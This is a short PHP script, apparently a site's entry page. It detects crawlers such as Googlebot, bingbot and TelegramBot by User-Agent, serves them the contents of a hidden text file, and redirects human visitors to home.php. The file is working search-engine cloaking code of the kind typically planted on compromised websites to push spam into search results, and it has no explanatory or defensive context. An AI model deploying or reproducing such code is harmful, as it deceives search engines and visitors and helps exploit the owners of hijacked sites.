<?php

function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bot_agents = ['Googlebot', 'bingbot', 'AhrefsBot', 'Google-Site-Verification', 'Google-InspectionTool', 'TelegramBot'];
    
    foreach ($bot_agents as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}


if (is_bot()) {

    echo file_get_contents('masukin.txt');
    exit;
}


?><?php

  header('location:home.php'); 

?>
